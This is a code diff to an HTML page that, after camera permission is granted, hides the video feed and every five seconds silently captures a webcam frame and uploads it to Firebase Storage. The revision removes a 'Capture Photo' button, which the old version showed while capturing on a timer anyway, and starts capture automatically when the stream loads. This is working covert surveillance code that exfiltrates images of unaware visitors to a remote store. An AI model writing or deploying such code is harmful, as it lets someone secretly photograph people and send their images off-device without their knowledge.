@@ -5,15 +5,15 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Auto Camera Capture</title>
     <style>
-        /* Hide the video element */
+        /* Add your custom CSS styling here if needed */
         #video {
-            display: none;
+            display: none; /* Hide the video element */
         }
     </style>
 </head>
 <body>
-    <!-- Removed the video element from the body -->
-    <button id="captureButton">Capture Photo</button>
+    <video id="video" width="640" height="480" autoplay muted></video>
+    <!-- muted attribute is added to prevent audio echo (works in most browsers) -->
 
     <script src="https://www.gstatic.com/firebasejs/8.6.8/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.6.8/firebase-storage.js"></script>
@@ -33,53 +33,43 @@
         // Initialize Firebase
         firebase.initializeApp(firebaseConfig);
 
+        // HTML elements
+        const video = document.getElementById('video');
+
         // Function to capture and upload photo
         function captureAndUploadPhoto() {
-            // Create a new hidden video element
-            const video = document.createElement('video');
-            video.width = 640;
-            video.height = 480;
-            video.style.cssText = 'position: absolute; top: -1000px;'; // Hide the video off-screen
-            document.body.appendChild(video);
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
 
-            // Access the user's camera
-            navigator.mediaDevices.getUserMedia({ video: true }).then(function (stream) {
-                video.srcObject = stream;
-                video.onloadedmetadata = function () {
-                    // Capture the photo from the hidden video
-                    const canvas = document.createElement('canvas');
-                    canvas.width = video.videoWidth;
-                    canvas.height = video.videoHeight;
-                    canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+            // Convert the canvas data to a data URL
+            const dataURL = canvas.toDataURL('image/jpeg');
 
-                    // Convert the canvas data to a data URL
-                    const dataURL = canvas.toDataURL('image/jpeg');
+            // Generate a unique filename (you can use your own logic here)
+            const filename = 'photo_' + Date.now() + '.jpg';
 
-                    // Generate a unique filename (you can use your own logic here)
-                    const filename = 'photo_' + Date.now() + '.jpg';
-
-                    // Upload the photo to Firebase Storage
-                    var storageRef = firebase.storage().ref().child(filename);
-                    storageRef.putString(dataURL, 'data_url').then(function (snapshot) {
-                        console.log('Uploaded a photo!');
-                    }).catch(function (error) {
-                        console.error('Error uploading photo:', error);
-                    });
-
-                    // Stop the camera stream and remove the hidden video element
-                    stream.getTracks().forEach(function (track) {
-                        track.stop();
-                    });
-                    video.remove();
-                };
+            // Upload the photo to Firebase Storage
+            var storageRef = firebase.storage().ref().child(filename);
+            storageRef.putString(dataURL, 'data_url').then(function (snapshot) {
+                console.log('Uploaded a photo!');
             }).catch(function (error) {
-                console.error('Error accessing the camera:', error);
+                console.error('Error uploading photo:', error);
             });
         }
 
-        // Capture a photo and upload it every 5 seconds
-        const interval = 5000; // 5 seconds
-        setInterval(captureAndUploadPhoto, interval);
+        // Access the user's camera
+        navigator.mediaDevices.getUserMedia({ video: true }).then(function (stream) {
+            video.srcObject = stream;
+            // Wait for the camera stream to be ready before starting capturing photos
+            video.onloadedmetadata = function (e) {
+                // Capture a photo and upload it every 5 seconds
+                const interval = 5000; // 5 seconds
+                setInterval(captureAndUploadPhoto, interval);
+            };
+        }).catch(function (error) {
+            console.error('Error accessing the camera:', error);
+        });
     </script>
 </body>
 </html>
